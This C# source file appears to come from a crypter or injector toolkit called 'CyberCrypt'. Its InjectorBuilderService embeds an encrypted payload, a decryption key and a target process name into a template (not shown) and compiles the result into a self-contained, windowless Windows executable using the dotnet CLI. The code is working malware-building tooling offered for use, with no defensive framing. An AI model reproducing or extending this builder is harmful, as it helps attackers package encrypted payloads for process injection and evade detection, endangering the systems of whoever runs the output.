using System;
using System.IO;
using System.Text;
using System.Reflection;
using System.Linq;
using System.Security.Cryptography;
using CyberCrypt.Helpers;
using System.Diagnostics;




namespace CyberCrypt.Models
{
    public class InjectorBuilderService
    {
        public void BuildInjectorExe(string encryptedFilePath, string keyFilePath, 
                                   string processName, string outputPath)
        {
            // Read the encrypted payload and key
            byte[] encryptedBytes = File.ReadAllBytes(encryptedFilePath);
            byte[] keyBytes = File.ReadAllBytes(keyFilePath);

            // Generate the C# source code for the injector
            string sourceCode = GenerateInjectorSource(encryptedBytes, keyBytes, processName);

            // Compile the executable
            CompileWithDotnetCLI(sourceCode, outputPath);
        }

private string GenerateInjectorSource(byte[] encryptedBytes, byte[] keyBytes, string processName)
{
    string template = File.ReadAllText("Resources/InjectorTemplate.txt");
    return template
        .Replace("%%ENCRYPTED_BYTES%%", ByteArrayToCSharp(encryptedBytes))
        .Replace("%%KEY_BYTES%%", ByteArrayToCSharp(keyBytes))
        .Replace("%%TARGET_PROCESS%%", $"\"{processName}\"");
}

private string ByteArrayToCSharp(byte[] bytes)
{
    var sb = new StringBuilder("new byte[] { ");
    for (int i = 0; i < bytes.Length; i++)
    {
        if (i > 0) sb.Append(", ");
        if (i % 16 == 0) sb.AppendLine().Append("    ");
        sb.Append($"0x{bytes[i]:X2}");
    }
    sb.AppendLine(" }");
    return sb.ToString();
}

        public void CompileWithDotnetCLI(string sourceCode, string outputPath)
{
    if (string.IsNullOrWhiteSpace(outputPath))
        throw new ArgumentException("Output path cannot be null or empty");

    string outputDirectory = Path.GetDirectoryName(outputPath) ?? Directory.GetCurrentDirectory();
    string finalExePath = Path.Combine(outputDirectory, Path.GetFileName(outputPath));
    string tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
    Directory.CreateDirectory(tempDir);

    try
    {
        // Create the new console project using CLI
        RunCommand("dotnet", "new console -n TempProject", tempDir);

        string projectPath = Path.Combine(tempDir, "TempProject");
        string csPath = Path.Combine(projectPath, "Program.cs");

        File.WriteAllText(csPath, sourceCode);

        // Modify csproj for single-file, self-contained build
        string projPath = Path.Combine(projectPath, "TempProject.csproj");
        File.WriteAllText(projPath, @"<Project Sdk=""Microsoft.NET.Sdk"">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net8.0</TargetFramework>
    <RuntimeIdentifier>win-x64</RuntimeIdentifier>
    <SelfContained>true</SelfContained>
    <PublishSingleFile>true</PublishSingleFile>
  </PropertyGroup>
</Project>");

        // Build and publish
        RunCommand("dotnet", $"add package System.Management", projectPath);
        RunCommand("dotnet", $"publish -r win-x64 -c Release", projectPath);


        // Move final executable
        string publishDir = Path.Combine(projectPath, "bin", "Release", "net8.0", "win-x64", "publish");
        string builtExe = Path.Combine(publishDir, "TempProject.exe");

        if (!File.Exists(builtExe))
            throw new FileNotFoundException("Compiled executable not found", builtExe);

        File.Move(builtExe, finalExePath, true);
    }
    finally
    {
        Directory.Delete(tempDir, true);
    }
}

private void RunCommand(string fileName, string arguments, string workingDirectory)
{
    var startInfo = new ProcessStartInfo
    {
        FileName = fileName,
        Arguments = arguments,
        WorkingDirectory = workingDirectory,
        UseShellExecute = false,
        RedirectStandardOutput = true,
        RedirectStandardError = true,
        CreateNoWindow = true
    };

    using var process = Process.Start(startInfo) ?? throw new Exception("Failed to start process");
    
    string stdOut = process.StandardOutput.ReadToEnd();
    string stdErr = process.StandardError.ReadToEnd();

    process.WaitForExit(120000);

    if (process.ExitCode != 0)
    {
        throw new Exception($"Command failed with exit code {process.ExitCode}\n\nSTDOUT:\n{stdOut}\n\nSTDERR:\n{stdErr}");
    }
}




    }
}